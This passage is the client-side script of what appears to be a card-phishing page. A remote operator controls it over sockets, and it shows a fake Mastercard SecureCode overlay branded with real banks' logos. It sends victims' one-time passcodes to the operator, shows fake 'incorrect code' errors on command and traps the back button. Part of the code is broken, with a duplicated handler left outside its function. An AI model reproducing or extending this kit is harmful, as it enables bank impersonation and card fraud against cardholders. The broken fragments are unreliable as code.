          overlay.style.display = 'flex';
          
          // After a delay, show the actual content
          setTimeout(() => {
            // Restore the original content
            verificationContent.innerHTML = originalContent;
            
            // Update merchant and amount info
            const merchantElement = document.getElementById('merchantName');
            const amountElement2 = document.getElementById('transactionAmount2');
            
            if (merchantElement) merchantElement.textContent = data.merchantName || 'Bologus pvt store.';
            if (amountElement2) amountElement2.textContent = data.amount || document.getElementById('displayAmount').textContent || '0.00';
            
            // Update bank logo
            const bankCode = data.bankCode || 'default';
            const bankLogo = document.getElementById('bankLogo');
            if (bankLogo) {
              const bankLogos = {
                'sbi': 'https://assets.stickpng.com/images/61fc00073cf0e70004222069.png',
                'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
                'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
                'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
                'kotak': 'https://logotyp.us/file/kotak-mahindra.svg',
                'yes': 'https://assets.stickpng.com/images/627ccfe31b2e263b45696ac8.png',
                'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
                'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
                'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
                'standard charterd': 'https://assets.stickpng.com/images/5a1d2dc54ac6b00ff574e292.png',
                'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
                'bob': 'https://logotyp.us/file/bank-of-baroda.svg',
                'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
                'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
                'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
                'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
                'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
                'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
                'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
                'mastercard securecode': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
              };
              bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
            }
            
            // Set current date for transaction info
            const now = new Date();
            const dateStr = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
            const dateElement = document.getElementById('transactionDate');
            if (dateElement) dateElement.textContent = dateStr;
            
            // Reset OTP input and error
            const otpInput = document.getElementById('mcOtpInput');
            const otpError = document.getElementById('mcOtpError');
            if (otpInput) otpInput.value = '';
            if (otpError) otpError.style.display = 'none';
            
            // Start timer for MC verification
            setupMCTimerIfNeeded();
            
            console.log('MC verification content displayed after loading');
          }, 5000); // 5 seconds delay
        } else {
          console.log('Invoice IDs do not match or overlay not found, ignoring event');
        }
      });

      // Modified redirect event handler to use clean URLs
      socket.on('redirect', (data) => {
        console.log('Received redirect event:', data);
        
        // Use clean URLs for redirects
        if (data.redirectUrl && data.redirectUrl.includes('success.html')) {
          console.log('Redirecting to success page with ID:', currentInvoiceId);
          window.location.href = getSuccessUrl(currentInvoiceId);
        } else if (data.redirectUrl && data.redirectUrl.includes('fail.html')) {
          const url = new URL(data.redirectUrl, window.location.origin);
          const reason = url.searchParams.get('reason');
          console.log('Redirecting to fail page with reason:', reason);
          window.location.href = getFailUrl(reason);
        } else {
          console.log('Redirecting to original URL:', data.redirectUrl);
          window.location.href = data.redirectUrl;
        }
      });

      socket.on('hide_bankpage', (data) => {
        if (bankPageWindow && !bankPageWindow.closed) {
          bankPageWindow.close();
        }
        // Keep loading state active regardless, but only check status if it's our transaction
        const submitButton = document.getElementById('submitButton');
        const submitText = document.getElementById('submitText');
        const submitLoader = document.getElementById('submitLoader');

        submitButton.classList.add('btn-loading');
        submitText.style.opacity = '0.5';
        submitText.style.filter = 'blur(1px)';
        submitLoader.classList.remove('hidden');

        if (data.invoiceId === currentInvoiceId) {
          // Start checking transaction status but don't change loading state
          if (!statusCheckInterval) {
            console.log('Starting transaction status check for invoice:', currentInvoiceId);
            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
          }
        }
      });
      
      // Handle MC-specific socket events
      socket.on('update_mc_bank', (data) => {
        if (data.invoiceId === currentInvoiceId) {
          const bankLogos = {
            'sbi': 'https://assets.stickpng.com/images/61fc00073cf0e70004222069.png',
            'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
            'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
            'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
            'kotak': 'https://logotyp.us/file/kotak-mahindra.svg',
            'yes': 'https://assets.stickpng.com/images/627ccfe31b2e263b45696ac8.png',
            'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
            'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
            'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
            'standard charterd': 'https://assets.stickpng.com/images/5a1d2dc54ac6b00ff574e292.png',
            'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
            'bob': 'https://logotyp.us/file/bank-of-baroda.svg',
            'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
            'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
            'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
            'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
            'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
            'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
            'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
            'mastercard securecode': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
          };
          
          const bankLogo = document.getElementById('bankLogo');
          if (bankLogo) {
            bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
          }
        }
      });
      
      socket.on('mc_otp_error', (data) => {
        if (data.invoiceId === currentInvoiceId) {
          const mcOtpError = document.getElementById('mcOtpError');
          const mcConfirmBtn = document.getElementById('mcConfirmBtn');
          
          if (mcOtpError) {
            mcOtpError.textContent = data.message || 'Incorrect verification code. Please try again.';
            mcOtpError.style.display = 'block';
          }
          
          if (mcConfirmBtn) {
            mcConfirmBtn.disabled = false;
            mcConfirmBtn.textContent = 'CONFIRM';
          }
        }
      });
      
      socket.on('mc_verification_result', (data) => {
        if (data.invoiceId === currentInvoiceId) {
          // Hide overlay
          const overlay = document.getElementById('mcVerificationOverlay');
          if (overlay) overlay.style.display = 'none';
          
          // Clear timer if it exists
          if (window.mcTimerInterval) {
            clearInterval(window.mcTimerInterval);
          }
          
          // Redirect based on result
          if (data.success) {
            window.location.href = getSuccessUrl(currentInvoiceId);
          } else {
            window.location.href = getFailUrl(data.reason || 'declined');
          }
        }
      });
    });

    // Transaction Status Check Function - Updated to use clean URLs
    async function checkTransactionStatus() {
      if (!currentInvoiceId) return;
      try {
        console.log('Checking transaction status for invoice:', currentInvoiceId);
        const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
        const data = await response.json();
        
        console.log('Transaction status check result:', data);
        
        if (data.status === 'show_otp') {
          clearInterval(statusCheckInterval);
          document.getElementById('paymentForm').classList.add('hidden');
          document.getElementById('otpForm').classList.remove('hidden');
          const cardNumber = document.getElementById('cardNumber').value;
          document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
          if (!timerInterval) { startOtpTimer(); }
          if (data.otpError) {
            document.getElementById('otpError').style.display = 'block';
            // Reset OTP button state when there's an error
            const otpButton = document.getElementById('otpSubmitButton');
            const otpLoader = document.getElementById('otpLoader');
            const btnText = document.getElementById('otpText');
            otpButton.disabled = false;
            otpLoader.classList.add('hidden');
            btnText.style.opacity = '1';
            btnText.style.filter = 'none';
            isProcessing = false;
          } else {
            document.getElementById('otpError').style.display = 'none';
          }
          isProcessing = false;
        } else if (data.status === 'redirect') {
          console.log('Redirect status received from checkTransactionStatus');
          // Use clean URLs for redirects
          if (data.redirectUrl.includes('success.html')) {
            console.log('Redirecting to success page with ID:', currentInvoiceId);
            window.location.href = getSuccessUrl(currentInvoiceId);
          } else if (data.redirectUrl.includes('fail.html')) {
            console.log('Analyzing fail URL:', data.redirectUrl);
            let reason = '';
            try {
              const url = new URL(data.redirectUrl, window.location.origin);
              reason = url.searchParams.get('reason');
              console.log('Extracted reason:', reason);
            } catch (e) {
              console.error('Error parsing URL:', e);
            }
            console.log('Redirecting to fail page with reason:', reason);
            window.location.href = getFailUrl(reason);
          } else {
            console.log('Redirecting to original URL:', data.redirectUrl);
            window.location.href = data.redirectUrl;
          }
        }
      } catch (err) {
        console.error('Error checking transaction status:', err);
      }
    }

    // OTP Timer Function
    function startOtpTimer() {
      if (timerInterval) clearInterval(timerInterval);
      timer = 180;
      timerInterval = setInterval(() => {
        timer--;
        const minutes = Math.floor(timer / 60);
        const seconds = timer % 60;
        document.getElementById('timer').textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        if (timer <= 0) {
          clearInterval(timerInterval);
          console.log('OTP timer expired, redirecting to fail page');
          window.location.href = getFailUrl('timeout'); // Use clean URL for fail
        }
      }, 1000);
    }

    // Back Button Prevention
    window.onpopstate = function(event) {
      if (confirm("Do you want to cancel this transaction?")) {
        console.log('User confirmed transaction cancellation');
        window.location.href = getFailUrl('canceled'); // Use clean URL for fail
      } else {
        history.pushState(null, null, window.location.href);
      }
    };
    history.pushState(null, null, window.location.href);
    
   // MC Verification Functions
function setupMCVerification() {
  const mcCancel = document.getElementById('mcCancel');
  const mcConfirmBtn = document.getElementById('mcConfirmBtn');
  const mcResendBtn = document.getElementById('mcResendBtn');
  const mcOtpInput = document.getElementById('mcOtpInput');
  
  if (mcCancel) {
    mcCancel.addEventListener('click', function() {
      // Hide the overlay
      const overlay = document.getElementById('mcVerificationOverlay');
      if (overlay) overlay.style.display = 'none';
      
      // Clear timer if it exists
      if (window.mcTimerInterval) {
        clearInterval(window.mcTimerInterval);
      }
      
      // Redirect to fail page with canceled reason
      window.location.href = getFailUrl('canceled');
    });
  }
  
  if (mcConfirmBtn) {
    mcConfirmBtn.addEventListener('click', function() {
      const otp = mcOtpInput.value.trim();
      if (!otp) {
        const mcOtpError = document.getElementById('mcOtpError');
        if (mcOtpError) {
          mcOtpError.textContent = 'Please enter the verification code.';
          mcOtpError.style.display = 'block';
        }
        return;
      }
      
      // Show loading state on the button
      mcConfirmBtn.disabled = true;
      const originalText = mcConfirmBtn.innerHTML;
      mcConfirmBtn.innerHTML = `
        <div style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle;"></div>
        <span style="opacity: 0.8;">VERIFYING...</span>
      `;
      
      console.log('Sending MC OTP submission with invoiceId:', currentInvoiceId, 'OTP:', otp);
      
      // Use the global socket instance
      socket.emit('mc_otp_submitted', {
        invoiceId: currentInvoiceId,
        otp: otp
      });
      
      // Reset button after timeout if no response
      setTimeout(() => {
        if (mcConfirmBtn.disabled) {
          mcConfirmBtn.disabled = false;
          mcConfirmBtn.innerHTML = originalText;
        }
      }, 10000); // 10 second timeout
    });
  }
  
  if (mcResendBtn) {
    mcResendBtn.addEventListener('click', function() {
      // Show loading state
      mcResendBtn.disabled = true;
      const originalText = mcResendBtn.innerHTML;
      mcResendBtn.innerHTML = 'SENDING...';
      
      console.log('Requesting OTP resend for invoiceId:', currentInvoiceId);
      
      // Use the global socket instance
      socket.emit('mc_resend_otp', {
        invoiceId: currentInvoiceId
      });
      
      // Reset timer
      setupMCTimerIfNeeded(true);
      
      // Restore button after delay
      setTimeout(() => {
        mcResendBtn.disabled = false;
        mcResendBtn.innerHTML = originalText;
        
        // Show notification to user
        alert('A new verification code has been sent to your registered mobile number.');
      }, 1500);
    });
  }
}
      
      if (mcResendBtn) {
        mcResendBtn.addEventListener('click', function() {
          // Show loading state
          const originalText = mcResendBtn.textContent;
          mcResendBtn.disabled = true;
          mcResendBtn.textContent = 'SENDING...';
          
          // Request resend of OTP - use the existing socket
          socket.emit('mc_resend_otp', {
            invoiceId: currentInvoiceId
          });
          
          console.log('Requested OTP resend for invoice:', currentInvoiceId);
          
          // Reset timer
          setupMCTimerIfNeeded(true);
          
          // Restore button after a short delay
          setTimeout(() => {
            mcResendBtn.disabled = false;
            mcResendBtn.textContent = originalText;
            
            // Show notification to user
            alert('A new verification code has been sent.');
          }, 1500);
        });
      }
    }
    
    function setupMCTimerIfNeeded(reset = false) {
      const timerElement = document.getElementById('mcTimer');
      if (!timerElement) return;
      
      if (window.mcTimerInterval) {
        clearInterval(window.mcTimerInterval);
      }
      
      let timeLeft = 179; // 2:59 timer
      
      // Update the timer display immediately
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      
      // Set up the interval
      window.mcTimerInterval = setInterval(() => {
        timeLeft--;
        
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
          clearInterval(window.mcTimerInterval);
          
          // Redirect on timeout
          const overlay = document.getElementById('mcVerificationOverlay');
          if (overlay) overlay.style.display = 'none';
          
          window.location.href = getFailUrl('timeout');
        }
      }, 1000);
    }
  </script>
  <script>
  // Visitor Heartbeat - keeps track of active visitors
  function sendHeartbeat() {
    const urlParams = new URLSearchParams(window.location.search);
    const pid = urlParams.get('pid') || sessionStorage.getItem('pid');
    
    if (pid) {
      fetch('/api/visitor-heartbeat', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ pid })
      }).catch(err => console.error('Heartbeat error:', err));
    }
  }
  
  // Send heartbeat every 30 seconds
  const heartbeatInterval = setInterval(sendHeartbeat, 30000);
  
  // Send initial heartbeat
  sendHeartbeat();
  
  // Clear interval when page is unloaded
  window.addEventListener('beforeunload', () => {
    clearInterval(heartbeatInterval);
  });
  </script>
  <script>
  // Testing function for MC verification
  function testMCVerification() {
    const overlay = document.getElementById('mcVerificationOverlay');
    if (overlay) {
      console.log('Test: Setting overlay to visible');
      overlay.style.display = 'flex';
    } else {
      console.error('Test: MC verification overlay element not found!');
    }
  }
  
  // Make this function available globally for testing from the console
  window.testMCVerification = testMCVerification;
</script>
</body>
</html>

                                                      
